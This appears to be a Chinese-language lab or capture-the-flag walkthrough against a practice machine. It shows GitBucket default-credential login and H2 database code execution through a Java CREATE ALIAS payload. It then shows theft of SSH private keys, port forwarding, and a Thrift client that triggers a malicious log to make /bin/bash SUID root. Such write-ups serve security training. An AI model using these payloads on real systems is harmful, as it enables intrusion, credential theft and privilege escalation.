
<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/a5ba5f13-7703-4548-82ec-895d52dd5f91" />

Nmap端口扫描，开放了22，80，8080，还有一个git库

<img width="415" height="393" alt="image" src="https://github.com/user-attachments/assets/b2e9fbf5-e3f9-4e84-9392-424041d79956" />

80端口页面是一个登录页面

<img width="415" height="231" alt="image" src="https://github.com/user-attachments/assets/b34669af-3130-4b84-a624-09639e99a879" />

8080端口是gitbucket

<img width="416" height="237" alt="image" src="https://github.com/user-attachments/assets/d26e1dc6-902c-4b61-8f9e-209e5e877530" />

使用gitbucket默认账号密码

<img width="415" height="233" alt="image" src="https://github.com/user-attachments/assets/43ea72a8-c194-4c47-ba74-1a059537b297" />

登录成功

<img width="415" height="134" alt="image" src="https://github.com/user-attachments/assets/7f4c238b-64b3-4583-9d3d-3c8f9c94a183" />

System administrator可以跳转到管理员面板，这里可以对数据库进行操作

<img width="415" height="229" alt="image" src="https://github.com/user-attachments/assets/4c29842d-0c50-482e-9436-f8395ed5731f" />

随便输入一条命令报错


<img width="415" height="348" alt="image" src="https://github.com/user-attachments/assets/0bf5bbc2-66d2-4a57-9021-11bcaf3e2908" />

H2数据库

H2数据库RCE
https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2

<img width="415" height="134" alt="image" src="https://github.com/user-attachments/assets/c7f686f7-6da8-457f-901e-3b26b9a9029b" />

并不能完全读写



根据H2数据库RCE漏洞详情的提示

<img width="415" height="234" alt="image" src="https://github.com/user-attachments/assets/c4ebf105-8586-49d1-b6ce-3e59e97bd728" />

我将创建一个调用JAVA代码的函数，使用这个函数来传递JAVA payload来运行系统命令 我的函数名为JOHNNY

<img width="415" height="98" alt="image" src="https://github.com/user-attachments/assets/8b1c3714-6331-48a3-ae5f-9a272b0cf125" />

CREATE ALIAS JOHNNY AS $$ String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}$$;

<img width="416" height="148" alt="image" src="https://github.com/user-attachments/assets/db2f561d-f922-4ce3-9797-ad8a3581eda7" />
这里反弹shell失败
尝试读取id_rsa

<img width="415" height="196" alt="image" src="https://github.com/user-attachments/assets/fa9f9bbb-d9ce-4ce6-b372-0f6f5f36659c" />

<img width="416" height="119" alt="image" src="https://github.com/user-attachments/assets/0818edf7-cc51-44d6-a395-13f8dd794810" />

这里一直找不到id_rsa
看了一下 应该是要获取这个id_ecdsa文件

<img width="415" height="136" alt="image" src="https://github.com/user-attachments/assets/a46bc359-8c5e-4afa-9f4a-d1c9a6166af2" />

<img width="328" height="277" alt="image" src="https://github.com/user-attachments/assets/63df459f-b068-453c-875d-73a965fa45ca" />

这里登录失败

<img width="416" height="243" alt="image" src="https://github.com/user-attachments/assets/e57abfac-be48-4c88-99ad-a8aa73c675dd" />

需要将私钥文件进行格式化一下

https://github.com/natro92/format_ssh_key_file

<img width="415" height="344" alt="image" src="https://github.com/user-attachments/assets/c9a2c3c7-a4f0-4ee0-ad51-52ecd8ea6e92" />

上传linpeas信息收集脚本

<img width="415" height="129" alt="image" src="https://github.com/user-attachments/assets/4961e9eb-efe8-44e2-b347-b381e27ea765" />

并没有多少可用的信息

回到网站，将Logservice项目git clone到Margo用户目录下面

<img width="416" height="182" alt="image" src="https://github.com/user-attachments/assets/b7f247f6-8d68-4d5f-a8bc-68f322777234" />

<img width="415" height="138" alt="image" src="https://github.com/user-attachments/assets/9d6680b6-adfd-424d-b5e6-d0a20ea032b3" />

https://thrift.apache.org/tutorial/py.html

执行thrift --gen py log_service.thrift

<img width="416" height="89" alt="image" src="https://github.com/user-attachments/assets/4782a6b4-62a0-4cbf-ab65-24e614a47557" />

Scp下载到本地

<img width="416" height="77" alt="image" src="https://github.com/user-attachments/assets/71a0ab74-d9bf-4949-bc27-a893eb969044" />

scp -i id_rsa margo@10.129.147.69:/home/margo/Logservice/log_service.thrift ./log_service.thrift


将靶机上9090端口流量带出来
ssh -i id_rsa -L 9090:127.0.0.1:9090 margo@10.129.147.69

<img width="415" height="349" alt="image" src="https://github.com/user-attachments/assets/adb095b0-2904-4f3f-b720-d788825e2ced" />

<img width="376" height="110" alt="image" src="https://github.com/user-attachments/assets/5c8eee2a-e15c-4e95-ade2-03fdf21f86d8" />

写入恶意利用日志
再写入johnny.sh 赋予/bin/bash所有者root权限


回到本地
thrift -r --gen py log_service.thrift

<img width="283" height="71" alt="image" src="https://github.com/user-attachments/assets/7f593945-6d11-475a-a5c9-7c4caa5a06b6" />

<img width="382" height="278" alt="image" src="https://github.com/user-attachments/assets/30cb3cbe-8169-40fb-85c5-ff0518508fb5" />

from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from log_service import LogService

def main():
    transport = TSocket.TSocket('127.0.0.1', 9090)
    transport = TTransport.TBufferedTransport(transport)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)
    client = LogService.Client(protocol)
    transport.open()
    try:
        response = client.ReadLogFile("/tmp/evil.log")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        transport.close()

if __name__ == "__main__":
    main()

将这个写入到client.py

然后执行这个文件

执行之后回到靶机
执行/bin/bash -p

<img width="263" height="62" alt="image" src="https://github.com/user-attachments/assets/4591a9be-0736-44ed-b177-d11ea5b3de52" />






